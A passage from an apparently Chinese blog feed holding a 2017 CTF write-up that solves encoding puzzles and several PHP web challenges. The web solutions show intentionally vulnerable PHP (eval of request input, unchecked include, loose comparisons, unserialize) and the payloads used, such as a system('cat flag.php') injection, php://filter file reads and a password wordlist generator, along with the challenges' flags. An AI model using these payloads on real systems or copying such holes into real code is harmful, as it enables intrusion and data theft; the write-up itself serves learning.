<span class="number">0</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                basefuzzDecode(t)</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> res</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> basefuzzDecode(baseRandomEncode(<span class="string">'flag&#123;hello ctf!&#125;'</span>))  <span class="comment"># test</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      caeser,morse,rail-fence,base64
    
    </summary>
    
      <category term="code" scheme="https://findneo.github.io/categories/code/"/>
    
    
      <category term="python" scheme="https://findneo.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>2017 miac writeup</title>
    <link href="https://findneo.github.io/2017/10/2017-miac-writeup/"/>
    <id>https://findneo.github.io/2017/10/2017-miac-writeup/</id>
    <published>2017-10-15T08:25:04.000Z</published>
    <updated>2017-11-22T10:35:59.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2017-10-14"><a href="#2017-10-14" class="headerlink" title="2017/10/14"></a>2017/10/14</h2><blockquote><p><a href="http://miac.cug.edu.cn/" target="_blank" rel="external">http://miac.cug.edu.cn/</a></p><p><a href="http://www.yogeit.com/" target="_blank" rel="external">http://www.yogeit.com/</a></p><p><a href="https://www.bdctf.online/" target="_blank" rel="external">https://www.bdctf.online/</a></p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="贝斯的一家"><a href="#贝斯的一家" class="headerlink" title="贝斯的一家"></a>贝斯的一家</h4><blockquote><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">&gt; UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY=</div><div class="line">&gt;</div></pre></td></tr></table></figure></blockquote><p>依次base64、base64、base32、base16解码。<br><code>flag{fl4g_1_B4se_i3_V3ry_9ood}</code></p><h4 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h4><blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt;  ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</div><div class="line">&gt;</div></pre></td></tr></table></figure></blockquote><p>aaencode ，<a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html" target="_blank" rel="external">在线解混淆</a> 或在 chrome 的console里直接运行即可。其他还有jjencode,ppencode,rrencode等。</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">alert(&quot;flag&#123;aaencode_f14g_h4h4h4&#125;&quot;)</div></pre></td></tr></table></figure><h4 id="你猜我像啥"><a href="#你猜我像啥" class="headerlink" title="你猜我像啥"></a>你猜我像啥</h4><blockquote><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">&gt; Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=</div><div class="line">&gt;</div></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</div><div class="line">s=<span class="string">'Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4='</span></div><div class="line">b64decode(s.replace(<span class="string">'\n'</span>,<span class="string">''</span>))  </div><div class="line"><span class="comment">#'.---- ..--- ..... -....- ..... .---- -....- ----. ..... -....- .---- ----- .---- -....- ----. ..... -....- ....- ---.. -....- ----. ..... -....- .---- ----- .---- -....- .---- .---- --... -....- .---- .---- -.... -....- .---- ..--- .---- -....- .---- ----- ---.. -....- .---- ..--- ----- -....- .---- .---- ....- -....- .---- .---- ----- -....- .---- ----- ....- -....- .---- ----- ---.. -....- ..... .---- -....- ..... .---- -....- .---- ..--- ...-- -....- .---- .---- ----- -....- .---- .---- .....'</span></div><div class="line"><span class="comment">#摩斯密码的解密(https://morsecode.scphillips.com/translator.html)</span></div><div class="line"><span class="comment">#=&gt;125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115</span></div><div class="line"><span class="comment">#ASCII码转字符&#125;3_e_0_eutylxrnhl33&#123;ns</span></div><div class="line">t=<span class="string">'125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115'</span></div><div class="line">tt=<span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:chr(int(x)),t.split(<span class="string">'-'</span>)))</div><div class="line"><span class="comment">#字符串反转  sn&#123;33lhnrxlytue_0_e_3&#125;</span></div><div class="line">rtt=tt[::<span class="number">-1</span>]</div><div class="line"><span class="comment">#栅栏密码的解密synt&#123;u3e3_l0h_ner_x3l&#125;</span></div><div class="line"><span class="comment">#凯撒密码解密 flag&#123;h3r3_y0u_are_k3y&#125;</span></div></pre></td></tr></table></figure><hr><h2 id="2017-10-23"><a href="#2017-10-23" class="headerlink" title="2017/10/23"></a>2017/10/23</h2><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB签到"><a href="#WEB签到" class="headerlink" title="WEB签到"></a>WEB签到</h4><blockquote><p>签到，格式bdctf{xxxxx}<br><a href="http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080" target="_blank" rel="external">http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="string">'flag.php'</span>);</div><div class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</div><div class="line">$flag = <span class="string">'bdctf&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'user'</span>] == $_POST[<span class="string">'pass'</span>])</div><div class="line">        <span class="keyword">print</span> <span class="string">'pass can not be user.'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'user'</span>]) === sha1($_POST[<span class="string">'pass'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</div><div class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>对数组进行哈希会返回null，所以传进去两个数组即可。<code>Flag: bdctf{welcomeBDCTF2017}</code></p><p><img src="web-checkin.png" alt=""></p><h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><blockquote><p>格式是flag{xxxx}<br><a href="http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080" target="_blank" rel="external">http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</div><div class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($a);"</span>);</div></pre></td></tr></table></figure><p>直接执行系统命令，<code>system(&#39;cat flag.php&#39;)</code> 。得到flag为<code>flag{93odcGA47rSRFDG}</code> </p><p><img src="cmd-inject.png" alt=""></p><h4 id="这不仅仅是WEB"><a href="#这不仅仅是WEB" class="headerlink" title="这不仅仅是WEB"></a>这不仅仅是WEB</h4><blockquote><p>格式bdctf{xxxxx}<br><a href="http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080" target="_blank" rel="external">http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080</a></p></blockquote><p>存在文件读取：</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line"><span class="comment">//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=index.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$file = $_GET[<span class="string">"page"</span>];</div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $file ) )</div><div class="line"><span class="keyword">include</span>( $file );</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">header( <span class="string">'Location:?page=include.php'</span> );</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="comment">//include.php</span></div><div class="line"><span class="comment">//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=include.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span><span class="string">'</span></div><div class="line"><span class="string">&lt;html&gt;</span></div><div class="line"><span class="string">&lt;body&gt;</span></div><div class="line"><span class="string">&lt;p align="center"&gt;</span></div><div class="line"><span class="string">&lt;font size="20"&gt;</span></div><div class="line"><span class="string">&lt;b&gt;File Include&lt;/b&gt;</span></div><div class="line"><span class="string">&lt;/font&gt;</span></div><div class="line"><span class="string">&lt;/p&gt;</span></div><div class="line"><span class="string">&lt;br&gt;</span></div><div class="line"><span class="string">&lt;p align="center"&gt;&lt;img src="photo.jpg"&gt;&lt;/p&gt;</span></div><div class="line"><span class="string">&lt;br&gt;</span></div><div class="line"><span class="string">&lt;br&gt;</span></div><div class="line"><span class="string">&lt;br&gt;</span></div><div class="line"><span class="string">&lt;font color="white"&gt;文件格式为文本格式&lt;/font&gt;</span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;'</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>访问不了惹。</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="MISC签到题"><a href="#MISC签到题" class="headerlink" title="MISC签到题"></a>MISC签到题</h4><blockquote><p><code>R1kzRE1RWldHRTNET04yQ0dZWkRHTVpXR0kzRElNWldHTVlUR01CVEdJWlRHTlJVR01ZVEdNUlRIRTNETU1aWkdZMlRHTVpUSEUzREVNWlVHWVlUR01SVEdZM0RFTVpaR000RE1NWlRHQTNETU1aVEdNM0RHTlJYSVE9PT09PT0=</code></p></blockquote><p>先base64解码，再base32解码，然后十六进制转ASCII码，得到flag为<code>flag{b3bd61023d129f9e39b4a26b98c0f366}</code></p><p><img src="misc-checkin.png" alt=""></p><h4 id="常规杂项"><a href="#常规杂项" class="headerlink" title="常规杂项"></a>常规杂项</h4><p>在文件末尾发现提示<code>Password:Bluedon[0-9]{8}</code>  ，写python脚本生成字典，<code>binwalk -e</code> 提取出压缩包，使用ziperello爆破得到密码为Bluedon47632601，解压后还是一个压缩包，但应该是伪加密，用notepad++打开即可看到flag为<code>flag{Aha!_Y0u_9Ot_i7}</code>。</p><p>队友使用了ARCHPR掩码爆破，方便很多。</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> itertools</div><div class="line">s0 = <span class="string">'Bluedon'</span></div><div class="line">p = <span class="string">'0123456789'</span></div><div class="line">f = open(<span class="string">'normalpass.txt'</span>, <span class="string">'w+'</span>)</div><div class="line">passwd = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(p, p, p, p, p, p, p, p):</div><div class="line">    passwd = s0 + <span class="string">''</span>.join(i)</div><div class="line">    f.write(passwd)</div></pre></td></tr></table></figure><p><img src="cracked.png" alt=""></p><p><img src="normal-misc-flag.png" alt=""></p><h4 id="就在眼前"><a href="#就在眼前" class="headerlink" title="就在眼前"></a>就在眼前</h4><blockquote><p>就在眼前<br>恩，如题。格式BDCTF{xxxxx}</p><p><code>flag=E5=80=BC=E5=B0=B1=E5=9C=A8=E6=AD=A4=E6=96=87=E6=A1=A3=E4=B8=AD=EF=BC=8C=E5=B9=B6=E4=B8=94=E4=BD=BF=E7=94=A8=E4=BA=86=E6=96=87=E6=9C=AC=E9=9A=90=E8=97=8F=E6=8A=8A=E8=87=AA=E5=B7=B1=E9=9A=90=E8=97=8F=E8=B5=B7=E6=9D=A5=E4=BA=86=E3=80=82=0A=E6=98=BE=E7=A4=BA=E5=87=BA=E9=9A=90=E8=97=8F=E6=96=87=E6=9C=AC=E5=8D=B3=E5=8F=AF</code></p></blockquote><p>使用了Quoted Printable encode，<a href="http://www.webatic.com/run/convert/qp.php" target="_blank" rel="external">在线解码</a> 可知隐藏了flag，让其显示即可。<code>BDCTF{Y0u_4Re_5ucCe5SFul}</code></p><p>队友将文件另存为XML，打开也可见flag。</p><p><img src="qpdecode.png" alt=""><img src="jiuzaiyanqian-flag.png" alt=""></p><hr><h2 id="2017-10-30"><a href="#2017-10-30" class="headerlink" title="2017/10/30"></a>2017/10/30</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><blockquote><p>更大的数，格式bdctf{xxx}<br><a href="http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080" target="_blank" rel="external">http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080</a></p></blockquote><p>修改表单长度限制。<code>bdctf{s0m2thing_ju8t_1ik2_thi8}</code></p><h4 id="简单的题"><a href="#简单的题" class="headerlink" title="简单的题"></a>简单的题</h4><blockquote><p>格式flag{xxxx}<br><a href="http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080" target="_blank" rel="external">http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $flag) == <span class="number">0</span>)</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"密码不正确！"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>post一个数组 <code>password[]=</code> 即可。<code>flag{Y0u_4re_G3t_FLAG_452}</code></p><h4 id="WEB100-2"><a href="#WEB100-2" class="headerlink" title="WEB100-2"></a>WEB100-2</h4><blockquote><p>提示是?hint，格式是flag{xxxx}<br><a href="http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080" target="_blank" rel="external">http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080</a></p></blockquote><p>根据提示访问<a href="http://127.0.0.1/ctfoj/bdctf.php?hint" target="_blank" rel="external">http://127.0.0.1/ctfoj/bdctf.php?hint</a> 得到源码。<br>带上<code>Cookie: BDCTF=s:21:&quot;BDCTF:www.bluedon.com&quot;%3b</code> 即可得到<code>flag{pBXeeZdOkG1QTP1}</code> 。cookie中的分号要url编码一下。</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">error_reporting(<span class="number">0</span>);  </div><div class="line">$KEY=<span class="string">'BDCTF:www.bluedon.com'</span>;  </div><div class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);  </div><div class="line"></div><div class="line">$cookie = $_COOKIE[<span class="string">'BDCTF'</span>];  </div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;  </div><div class="line">    show_source(<span class="keyword">__FILE__</span>);  </div><div class="line">&#125;  </div><div class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)  </div><div class="line">&#123;     </div><div class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;  </div><div class="line">&#125;  </div><div class="line"><span class="keyword">else</span> &#123;  foo</div></pre></td></tr></table></figure><h4 id="蓝盾管理员"><a href="#蓝盾管理员" class="headerlink" title="蓝盾管理员"></a>蓝盾管理员</h4><blockquote><p>you are not bd-admin，格式bdctf{xxx}<br><a href="http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080" target="_blank" rel="external">http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080</a></p></blockquote><p>访问<code>view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php&amp;user=php://input</code> 同时post <code>the user is bdadmin</code> 得到<code>bd-admin!&lt;br&gt;PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+</code> ，解码后得到<code>bdctf{Lfi_AnD_More}</code></p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line">&lt;!--  </div><div class="line">@$user = $_GET[<span class="string">"user"</span>];  </div><div class="line">@$file = $_GET[<span class="string">"file"</span>];  </div><div class="line">  </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is bdadmin"</span>))&#123;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello bd-admin!&lt;br&gt;"</span>;  </div><div class="line"><span class="keyword">include</span>($file); <span class="comment">//flag.php  </span></div><div class="line">&#125;<span class="keyword">else</span>&#123;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not bd-admin ! "</span>;  </div><div class="line">&#125;  </div><div class="line"> --&gt;</div></pre></td></tr></table></figure><h4 id="送大礼"><a href="#送大礼" class="headerlink" title="送大礼"></a>送大礼</h4><blockquote><p>格式bdctf{xxx}<br><a href="http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080" target="_blank" rel="external">http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080</a></p></blockquote><p>访问 <code>http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt</code>  有jsfuck，<a href="http://codertab.com/jsunfuck" target="_blank" rel="external">解开</a> 后内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">extract($_GET);  </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($bdctf))  </div><div class="line">&#123;      </div><div class="line">  $content=trim(file_get_contents($flag));</div><div class="line">  <span class="keyword">if</span>($bdctf==$content)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">echo</span><span class="string">'bdctf&#123;**********&#125;'</span>;</div><div class="line">  &#125;    <span class="keyword">else</span></div><div class="line">  &#123; </div><div class="line">    <span class="keyword">echo</span><span class="string">'这不是蓝盾的密码啊'</span>;</div><div class="line">  &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure><p>访问 